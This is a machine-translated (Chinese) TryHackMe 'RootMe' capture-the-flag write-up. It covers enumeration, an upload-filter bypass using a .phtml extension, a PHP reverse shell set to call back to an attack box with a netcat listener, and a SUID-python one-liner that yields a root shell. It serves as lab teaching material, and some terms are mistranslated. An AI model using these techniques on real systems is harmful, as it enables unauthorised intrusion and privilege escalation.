<html>
<head>
<title>TryHackMe writeup: RootMe</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe writeup: RootMe</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-rootme-7140eeb6b99f?source=collection_archive---------3-----------------------#2022-12-09">https://infosecwriteups.com/tryhackme-writeup-rootme-7140eeb6b99f?source=collection_archive---------3-----------------------#2022-12-09</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><p id="4a98" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">RootMe<a class="ae kp" href="https://tryhackme.com/room/rrootme" rel="noopener ugc nofollow" target="_blank">(“ReddyyZ”2020)</a>是一个TryHackme房间，面向初学者或希望练习技能的人。这个房间相当简单:它强化了良好的攻击性安全实践，如枚举和“更加努力地尝试”在本文中，我将讨论我获得对目标系统的初始访问和权限提升的过程。</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj kq"><img src="../Images/92c1ee13bb1b3f34668ea930d1d66b84.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d4q1ICseQBKebkrmGSXovw.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">来自<a class="ae kp" href="https://aminoapps.com/c/anime/page/blog/degtop-10-female-katana-usersdeg/K5tM_uPPmo0kxPmL1PZ5PvN7JDqwk" rel="noopener ugc nofollow" target="_blank">氨基应用(2016) </a>的一些图像组件</figcaption></figure><h1 id="5cbe" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">目录一览</h1><ol class=""><li id="de0b" class="me mf iu jt b ju mg jy mh kc mi kg mj kk mk ko ml mm mn mo bi translated">程序</li><li id="f047" class="me mf iu jt b ju mp jy mq kc mr kg ms kk mt ko ml mm mn mo bi translated">结束事项</li><li id="c3f2" class="me mf iu jt b ju mp jy mq kc mr kg ms kk mt ko ml mm mn mo bi translated">参考</li></ol><h1 id="0ea9" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">程序</h1><p id="9136" class="pw-post-body-paragraph jr js iu jt b ju mg jw jx jy mh ka kb kc mu ke kf kg mv ki kj kk mw km kn ko in bi translated"><a class="ae kp" href="https://tryhackme.com/room/rrootme" rel="noopener ugc nofollow" target="_blank">《ReddyyZ》(2020)</a>将房间描述为“<em class="mx">【a】CTF供初学者使用。</em>“目标是检索一个与存储在名为<code class="fe my mz na nb b">user.txt</code>的文件中的<code class="fe my mz na nb b">root</code>或<code class="fe my mz na nb b">SYSTEM</code>特权相比具有较低权限的可访问标志，然后运行特权升级利用来访问名为<code class="fe my mz na nb b">root.txt</code>的文件中的标志。有了明确的目标，我就可以着手评估目标系统的漏洞，并获得访问系统的权限。</p><p id="dc12" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">作为准备，我修改了我的<em class="mx"> AttackBox的</em> <code class="fe my mz na nb b">/etc/hosts</code>文件，以包含一个名为<code class="fe my mz na nb b">rrootme.thm</code>的伪域，指向目标系统的动态IP地址。然后，我点击这个房间第一个任务右上角的绿色“[s]start[m]machine ”,开始探测系统。</p><h2 id="3f9f" class="nc lh iu bd li nd ne dn lm nf ng dp lq kc nh ni lu kg nj nk ly kk nl nm mc nn bi translated">探索</h2><p id="ca99" class="pw-post-body-paragraph jr js iu jt b ju mg jw jx jy mh ka kb kc mu ke kf kg mv ki kj kk mw km kn ko in bi translated">我让我的攻击箱的网络浏览器访问<code class="fe my mz na nb b">rrootme.thm</code>,看看系统上是否有网站在运行。图1描述了系统的主页，其中有一个相当有趣的挑战:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj no"><img src="../Images/4aa4bc9bf00b59a5c8bb29b2441500db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9qwCfFDBEY9IO_6ipLwo6g.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">图1</figcaption></figure><p id="3126" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我继续使用<a class="ae kp" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank"> nmap (n.d.) </a>探测目标系统上运行的网络服务，也许我可以使用其中一个作为漏洞载体，以获得对目标的初始访问权限:</p><pre class="kr ks kt ku gu np nb nq bn nr ns bi"><span id="fbf0" class="nt lh iu nb b be nu nv l nw nx"><strong class="nb iv">┌──(dna㉿deniers)-[~/rrootme]<br/>└─$ sudo nmap -sT -A -v -Pn -p- -O -sC -oX tcp_scan.xml --max-scan-delay=5s rrootme.thm     </strong><br/>Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.<br/>Starting Nmap 7.93 ( https://nmap.org ) at [redacted]<br/>NSE: Loaded 155 scripts for scanning.<br/>NSE: Script Pre-scanning.<br/>Initiating NSE at 13:07<br/>Completed NSE at 13:07, 0.00s elapsed<br/>Initiating NSE at 13:07<br/>Completed NSE at 13:07, 0.00s elapsed<br/>Initiating NSE at 13:07<br/>Completed NSE at 13:07, 0.00s elapsed<br/>Initiating Connect Scan at 13:07<br/>Scanning rrootme.thm [65535 ports]<br/><br/>[... snip ...]</span></pre><p id="ad76" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">当<em class="mx"> nmap </em>扫描正在探测目标系统的端口时，我运行了<em class="mx">gobuster</em>(<a class="ae kp" href="https://github.com/OJ/gobuster" rel="noopener ugc nofollow" target="_blank">Mehlmauer et al . n . d .</a>)来查找其HTTP服务上潜在的隐藏子目录:</p><pre class="kr ks kt ku gu np nb nq bn nr ns bi"><span id="5ebf" class="nt lh iu nb b be nu nv l nw nx"><strong class="nb iv">┌──(dna㉿deniers)-[~]<br/>└─$ gobuster dir -u http://rrootme.thm -w ~/rrootme/subdirectories.txt -x php,bak,htm,html -t 40</strong><br/>===============================================================<br/>Gobuster v3.3<br/>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br/>===============================================================<br/>[+] Url:                     http://rrootme.thm<br/>[+] Method:                  GET<br/>[+] Threads:                 40<br/>[+] Wordlist:                ~/rrootme<br/>[+] Negative Status codes:   404<br/>[+] User Agent:              gobuster/3.3<br/>[+] Extensions:              php,bak,htm,html<br/>[+] Timeout:                 10s<br/>===================================================================<br/>[redacted] Starting gobuster in directory enumeration mode<br/>===================================================================<br/><br/>[... snip ...]</span></pre><p id="1fdf" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">过了一会儿，<em class="mx"> nmap </em>和<em class="mx"> gobuster </em>扫描都完成了，我能够使用<code class="fe my mz na nb b">xsltproc</code>实用程序(xsltproc n.d .)将来自<em class="mx"> nmap </em>扫描的XML输出转换成可读的HTML格式:</p><pre class="kr ks kt ku gu np nb nq bn nr ns bi"><span id="2b7a" class="nt lh iu nb b be nu nv l nw nx"><strong class="nb iv">┌──(dna㉿deniers)-[~/rrootme]<br/>└─$ xsltproc tcp_scan.xml -o tcp_scan.html                                             <br/>                                                                                                                                                                       <br/>┌──(dna㉿deniers)-[~/rrootme]<br/>└─$</strong></span></pre><p id="0873" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">图2描述了<em class="mx"> nmap </em>扫描的渲染HTML结果:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj ny"><img src="../Images/f9db700abe9a843a6416062ec529663e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eHGwFGtBCwDdNWyPuA59lg.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">图2</figcaption></figure><p id="5e34" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">只有两(2)个端口可用于进一步探测:一个<a class="ae kp" href="https://www.openssh.com/txt/release-7.6" rel="noopener ugc nofollow" target="_blank"> OpenSSH (v. 7.6p1) </a>服务和一个<a class="ae kp" href="https://www.apachelounge.com/Changelog-2.4.html" rel="noopener ugc nofollow" target="_blank"> Apache HTTP服务(v. 2.4.29) </a>。目标系统最有可能运行的操作系统是Ubuntu(未标明)。Linux。攻击web服务可能是阻力最小的途径，因为web应用程序确实有一个相当大的攻击面(参见<a class="ae kp" href="https://nostarch.com/bughunting" rel="noopener ugc nofollow" target="_blank">Yaworski 2019</a>；<a class="ae kp" href="https://www.wiley.com/en-us/Hands+on+Hacking:+Become+an+Expert+at+Next+Gen+Penetration+Testing+and+Purple+Teaming-p-9781119561453" rel="noopener ugc nofollow" target="_blank">Hickey&amp;Arcuri 2020</a>；<a class="ae kp" href="https://www.oreilly.com/library/view/web-application-security/9781492053101/" rel="noopener ugc nofollow" target="_blank">霍夫曼2020；</a> <a class="ae kp" href="https://nostarch.com/bug-bounty-bootcamp" rel="noopener ugc nofollow" target="_blank">李2021 </a>)。</p><p id="70ba" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">最终，<em class="mx"> gobuster </em>实例完成了，我从web服务中获得了以下子目录:</p><pre class="kr ks kt ku gu np nb nq bn nr ns bi"><span id="2f41" class="nt lh iu nb b be nu nv l nw nx">/.php                 (Status: 403) [Size: 276]<br/>/.html                (Status: 403) [Size: 276]<br/>/index.php            (Status: 200) [Size: 616]<br/>/.htm                 (Status: 403) [Size: 276]<br/>/uploads              (Status: 301) [Size: 312] [--&gt; http://rrootme.thm/uploads/]<br/>/css                  (Status: 301) [Size: 308] [--&gt; http://rrootme.thm/css/]<br/>/js                   (Status: 301) [Size: 307] [--&gt; http://rrootme.thm/js/]<br/>/panel                (Status: 301) [Size: 310] [--&gt; http://rrootme.thm/panel/]<br/>/.php                 (Status: 403) [Size: 276]<br/>/.htm                 (Status: 403) [Size: 276]<br/>/.html                (Status: 403) [Size: 276]<br/>/server-status        (Status: 403) [Size: 276]<br/>Progress: 1038215 / 1038220 (100.00%)<br/>[redacted] Finished</span></pre><p id="42ef" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我注意到了<code class="fe my mz na nb b">/panel/</code>和<code class="fe my mz na nb b">/uploads/</code>子目录，我将首先用我的攻击箱的网络浏览器导航到<code class="fe my mz na nb b">/panel/</code>。图3描述了浏览器返回的内容:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj nz"><img src="../Images/8dd3aa6e7bfa7d1f12d7436dc9595265.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*faXRdqedx7CnkUDZxWSrKQ.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">图3</figcaption></figure><p id="efc7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我认为这是一种我可以上传文件的机制。我将尝试利用它来上传一个机制，通过它我可以启动一个反向外壳。</p><h2 id="998b" class="nc lh iu bd li nd ne dn lm nf ng dp lq kc nh ni lu kg nj nk ly kk nl nm mc nn bi translated">初始访问</h2><p id="7e5d" class="pw-post-body-paragraph jr js iu jt b ju mg jw jx jy mh ka kb kc mu ke kf kg mv ki kj kk mw km kn ko in bi translated">我考虑了我可以上传到网络服务器的不同种类的植入，我决定尝试使用由<a class="ae kp" href="https://github.com/pentestmonkey/php-reverse-shell" rel="noopener ugc nofollow" target="_blank">“pentest monkey”(n . d .)</a>创建的反向PHP shell。我将其配置为向我的攻击箱报告:</p><pre class="kr ks kt ku gu np nb nq bn nr ns bi"><span id="f394" class="nt lh iu nb b be nu nv l oa nx">[... snip ...]<br/><br/>set_time_limit (0);<br/>$VERSION = "1.0";<br/>$ip = 'attackbox.thm';  // CHANGE THIS<br/>$port = 4444;       // CHANGE THIS<br/>$chunk_size = 1400;<br/>$write_a = null;<br/><br/>[... snip ...]</span></pre><p id="b06d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">具体来说，我已经重置了变量<code class="fe my mz na nb b">$ip</code>和<code class="fe my mz na nb b">$port</code>，以连接回我在端口4444上的<em class="mx">攻击箱</em>。然后，我试图将这个脚本上传到目标系统的web浏览器上。图3描述了<code class="fe my mz na nb b">/panel/</code>页面返回的内容:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj ob"><img src="../Images/b548fa86d0b3cab546f2296c3903b7e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sxWtUTn690rniYhJpRLBgA.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">图3</figcaption></figure><p id="7aea" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我推测这是一个错误信息，说明PHP脚本不允许上传到系统上。我使用了<a class="ae kp" href="https://translate.google.com/" rel="noopener ugc nofollow" target="_blank"> Google Translate (n.d.) </a>来确认这一点，它检测到葡萄牙语是错误消息的语言，并且它显示“<em class="mx"> PHP是不允许的！</em>”</p><p id="b5ad" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我开始尝试不同的文件扩展名，以通过我认为是过滤不同类型的“坏”文件扩展名的黑名单。为了绕过这一点，我尝试使用<code class="fe my mz na nb b">.phtml</code>扩展，它允许我的<code class="fe my mz na nb b">reverse.php</code>脚本上传到目标系统上；如图4所示:</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div role="button" tabindex="0" class="kw kx di ky bf kz"><div class="gi gj oc"><img src="../Images/2464ba550b237790fcd8445730ef6197.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ypHA7d2KkMZ9OGXUZwKngA.png"/></div></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">图4</figcaption></figure><p id="a0b7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">葡萄牙语消息大致翻译为"<em class="mx">[t]文件已成功上传！</em>“我现在可以启动反向连接了。</p><figure class="kr ks kt ku gu kv gi gj paragraph-image"><div class="gi gj od"><img src="../Images/d11da55b3fb20d26bfb8c0cd41b660e7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1070/format:webp/1*SOanJnQIixKW0Jtc_2HQNg.png"/></div><figcaption class="lc ld gk gi gj le lf bd b be z dk translated">图4</figcaption></figure><p id="c5f8" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">要启动反向外壳，我需要触发<code class="fe my mz na nb b">reverse.phtml</code>。但在此之前，我将在我的AttackBox上设置一个<a class="ae kp" href="https://netcat.sourceforge.net/" rel="noopener ugc nofollow" target="_blank"> netcat (n.d.) </a>监听器来监听接受任何反向shell请求:</p><pre class="kr ks kt ku gu np nb nq bn nr ns bi"><span id="51e1" class="nt lh iu nb b be nu nv l nw nx"><strong class="nb iv">┌──(dna㉿deniers)-[~/rrootme]<br/>└─$ nc -lvnp 4444    </strong>  <br/>listening on [any] 4444 ...</span></pre><p id="0b50" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">触发<code class="fe my mz na nb b">reverse.phtml</code>就像点击它一样简单。这样做向我展示了相反的外壳:</p><pre class="kr ks kt ku gu np nb nq bn nr ns bi"><span id="6fc4" class="nt lh iu nb b be nu nv l nw nx">listening on [any] 4444 ...<br/>connect to [attacker.thm] from (UNKNOWN) [rrootme.thm] 55952<br/>Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux<br/> [redacted],  0 users,  load average: 0.00, 0.00, 0.00<br/>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br/>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br/>/bin/sh: 0: can't access tty; job control turned off<br/><strong class="nb iv">$</strong></span></pre><p id="8b5c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我现在可以转储该标志了:</p><pre class="kr ks kt ku gu np nb nq bn nr ns bi"><span id="140e" class="nt lh iu nb b be nu nv l nw nx"><strong class="nb iv">$ find . -name user.txt -print 2&gt;/dev/null</strong><br/>./var/www/user.txt<br/><strong class="nb iv">$ cat ./var/www/user.txt</strong><br/>THM{redacted}<br/><strong class="nb iv">$</strong></span></pre><p id="7149" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">非常好。</p><h2 id="4cf6" class="nc lh iu bd li nd ne dn lm nf ng dp lq kc nh ni lu kg nj nk ly kk nl nm mc nn bi translated">后剥削</h2><p id="2248" class="pw-post-body-paragraph jr js iu jt b ju mg jw jx jy mh ka kb kc mu ke kf kg mv ki kj kk mw km kn ko in bi translated">现在我需要得到系统的根标志。我的过程是使用<code class="fe my mz na nb b">find</code>命令探测系统中设置了粘性位标志的二进制文件:</p><pre class="kr ks kt ku gu np nb nq bn nr ns bi"><span id="bfb0" class="nt lh iu nb b be nu nv l nw nx"><strong class="nb iv">$ find / -type f -perm /4000 -print 2&gt;/dev/null</strong><br/><br/>[... snip ...]<br/><br/>/usr/bin/newgidmap<br/>/usr/bin/chsh<br/>/usr/bin/python<br/>/usr/bin/at<br/><br/>[... snip ...]<br/><br/><strong class="nb iv">$</strong></span></pre><p id="2263" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">特别是，<a class="ae kp" href="https://www.python.org/" rel="noopener ugc nofollow" target="_blank"> Python (n.d.) </a>解释器设置了粘性位。这是好东西，因为可以利用它来获得根壳。以下是我从前述文章中复制的逻辑:</p><pre class="kr ks kt ku gu np nb nq bn nr ns bi"><span id="0301" class="nt lh iu nb b be nu nv l nw nx"><strong class="nb iv">$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'</strong><br/><strong class="nb iv"># id</strong><br/>uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)<br/><strong class="nb iv">#</strong></span></pre><p id="1acc" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">现在我可以通过一个<code class="fe my mz na nb b">/bin/sh</code>的<code class="fe my mz na nb b">root</code>实例来执行命令。我现在可以转储根标志了:</p><pre class="kr ks kt ku gu np nb nq bn nr ns bi"><span id="4d71" class="nt lh iu nb b be nu nv l nw nx"><strong class="nb iv"># cat /root/root.txt</strong><br/>THM{redacted}<br/><strong class="nb iv"># </strong></span></pre><p id="3591" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">阿洛拉。</p><h1 id="06de" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">结束事项</h1><p id="d86a" class="pw-post-body-paragraph jr js iu jt b ju mg jw jx jy mh ka kb kc mu ke kf kg mv ki kj kk mw km kn ko in bi translated">这是一个相当简单的房间，可以用来练习基本的攻击性安全工程程序。我首先用端口扫描和子目录枚举来探测系统。然后，我将一个PHP脚本上传到目标web服务器上，使用一个不常见的文件扩展名来绕过过滤器，并以此为基础启动一个反向shell。我最终开发了一个Python二进制文件，它的粘性位被设置为获得系统的根访问权限——允许我完成我的目标。</p><p id="0bc8" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">主要的收获是实践是一件好事，因为这个房间里的材料是相当初级的。具体来说，渗透测试人员或red teamer应该尝试列举获得系统初始访问权限和提升权限的可能方法。</p><h2 id="0728" class="nc lh iu bd li nd ne dn lm nf ng dp lq kc nh ni lu kg nj nk ly kk nl nm mc nn bi translated">插头</h2><p id="e876" class="pw-post-body-paragraph jr js iu jt b ju mg jw jx jy mh ka kb kc mu ke kf kg mv ki kj kk mw km kn ko in bi translated">对于喜欢我的作品但尚未注册Medium会员计划的读者，如果他们能通过我的推荐链接注册，我将不胜感激(这在经济上帮助了我https://medium.com/membership/@EpsilonCalculus ❤️):<a class="ae kp" href="https://medium.com/membership/@EpsilonCalculus" rel="noopener"/></p><p id="17a2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">此外，对于任何喜欢阅读我的黑客文章的读者，我邀请他们看看我的技术文章系列，主要由CTF的文章组成，但也有其他计算机和STEM内容😃</p><div class="oe of gq gs og"><div role="button" tabindex="0" class="ab bv gw cb fq oh oi bn oj la ex"><div class="ok l"><div class="ab q"><div class="l di"><img alt="Aleksey" class="l de bw ol om fe" src="../Images/886245347566d4089464c40d5ec5ccfc.png" width="20" height="20" loading="lazy" data-original-src="https://miro.medium.com/v2/resize:fill:40:40/1*QCw3Unyn7vnntVR7WHXImA.png"/><div class="fb bw l ol om fc n aw fd"/></div><div class="hi l fp"><p class="bd b dl z fq fr fs ft fu fv fw fx dk translated">阿列克谢</p></div></div><div class="op oq gx l"><h2 class="bd iv uc me fq ud fs ft ue fv fx it bi translated">技术报道</h2></div><div class="ab q"><div class="l fp"><a class="bd b be z bi uf au ug uh ui qv uj an eh ei uk ul um el em eo de bk ep" href="https://medium.com/@EpsilonCalculus/list/technical-writeups-63f8cfbee59c?source=post_page-----7140eeb6b99f--------------------------------" rel="noopener follow" target="_top">View list</a></div><div class="un l fp"><span class="bd b dl z dk">43 stories</span></div></div></div><div class="pc dh pd fq ab pe fp di"><div class="di ou bv ov ow"><div class="dh l"><img alt="" class="dh" src="../Images/e91d6d5a97594a0fdfb555761a774256.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*Cq7_tlU0Ukq_pR63YMHgCg.png"/></div></div><div class="di ou bv ox oy oz"><div class="dh l"><img alt="" class="dh" src="../Images/637c9938ab55d24718c20c200ddda1a0.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*pkGgeXcrKXaHU2eki1bOHQ.png"/></div></div><div class="di bv pa pb oz"><div class="dh l"><img alt="" class="dh" src="../Images/78df73524bea8b23f1be91acbb669dc6.png" width="194" height="194" loading="lazy" role="presentation" data-original-src="https://miro.medium.com/v2/resize:fill:388:388/1*_1zitov03vXXuoYr2lje2A.png"/></div></div></div></div></div><h1 id="ba22" class="lg lh iu bd li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb mc md bi translated">参考</h1><p id="0897" class="pw-post-body-paragraph jr js iu jt b ju mg jw jx jy mh ka kb kc mu ke kf kg mv ki kj kk mw km kn ko in bi translated">氨基应用(2016)。<em class="mx">十大女性武士刀使用者</em>。2022年12月8日检索自:<a class="ae kp" href="https://aminoapps.com/c/anime/page/blog/degtop-10-female-katana-usersdeg/K5tM_uPPmo0kxPmL1PZ5PvN7JDqwk" rel="noopener ugc nofollow" target="_blank">https://amino PPS . com/c/anime/page/blog/deg top-10-female-katana-users deg/K5tM _ uppmo 0 kpml 1 pz 5 PVN 7 jdqwk</a></p><p id="5530" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Apache HTTP服务器(2.4.29版)。<em class="mx">更改日志</em>。阿帕奇休息室。2022年12月7日检索自:<a class="ae kp" href="https://www.apachelounge.com/Changelog-2.4.html" rel="noopener ugc nofollow" target="_blank">https://www.apachelounge.com/Changelog-2.4.html</a></p><p id="7e71" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">谷歌翻译(未注明)。2022年12月8日检索自:<a class="ae kp" href="https://translate.google.com/" rel="noopener ugc nofollow" target="_blank">https://translate.google.com/</a></p><p id="6ba2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">GTFOBins(未标明)。<em class="mx"> python </em>。2022年12月8日检索自:<a class="ae kp" href="https://gtfobins.github.io/gtfobins/python/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/python/</a></p><p id="1b2a" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Hickey，m .和Arcuri，J. (2020年)。<em class="mx">动手黑客:成为新一代渗透测试和紫色团队的专家</em>。约翰·威利的儿子们。</p><p id="a429" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Web应用安全:现代Web应用的开发和对策。奥赖利媒体公司。</p><p id="fc91" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">李诉(2021)。Bug Bounty Bootcamp:寻找和报告网络漏洞指南。没有淀粉压机。</p><p id="8287" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Mehlmauer等人(未注明)。<em class="mx">Gobuster v 3 . 2 . 0:Go中编写的目录/文件、DNS和VHost破坏工具</em>。GitHub仓库。2022年12月7日检索自:<a class="ae kp" href="https://github.com/OJ/gobuster" rel="noopener ugc nofollow" target="_blank">https://github.com/OJ/gobuster</a></p><p id="c8d4" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">netcat(未标明)。GNU Netcat项目。2022年12月8日检索自:<a class="ae kp" href="https://netcat.sourceforge.net/" rel="noopener ugc nofollow" target="_blank">https://netcat.sourceforge.net/</a></p><p id="187d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">nmap(未标明)。<em class="mx"> Nmap:无网络映射器的安全扫描器</em>。2022年12月7日检索自:<a class="ae kp" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/</a></p><p id="6411" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">OpenSSH(7.6p 1版)。<em class="mx">发行说明</em>。2022年12月7日检索自:<a class="ae kp" href="https://www.openssh.com/txt/release-7.6" rel="noopener ugc nofollow" target="_blank">https://www.openssh.com/txt/release-7.6</a></p><p id="38f6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">“pentestmonkey”(未注明)。<em class="mx">PHP-反向-shell </em>。GitHub仓库。2022年12月8日检索自:【https://github.com/pentestmonkey/php-reverse-shell T2】</p><p id="5dc3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Python(未注明日期)。欢迎来到Python.org，T4。2022年12月8日检索自:<a class="ae kp" href="https://www.python.org/" rel="noopener ugc nofollow" target="_blank">https://www.python.org/</a></p><p id="18ad" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">《ReddyyZ》(2020)。<em class="mx"> RootMe </em>。TryHackMe。2022年12月7日检索自:<a class="ae kp" href="https://tryhackme.com/room/rrootme" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/rrootme</a></p><p id="0e9d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Ubuntu(未注明日期)。<em class="mx">Ubuntu的故事</em>。2022年12月7日检索自:<a class="ae kp" href="https://ubuntu.com/about" rel="noopener ugc nofollow" target="_blank">https://ubuntu.com/about</a></p><p id="2564" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">xsltproc(未标明)。<em class="mx"> xsltproc —命令行xslt处理器</em>。2022年12月7日检索自:<a class="ae kp" href="http://xmlsoft.org/xslt/xsltproc.html" rel="noopener ugc nofollow" target="_blank">http://xmlsoft.org/xslt/xsltproc.html</a></p><p id="cd1c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">Yaworski，P. (2019)。真实世界的臭虫狩猎:网络黑客的实地指南。没有淀粉压机。</p></div><div class="ab cl pj pk hy pl" role="separator"><span class="pm bw bk 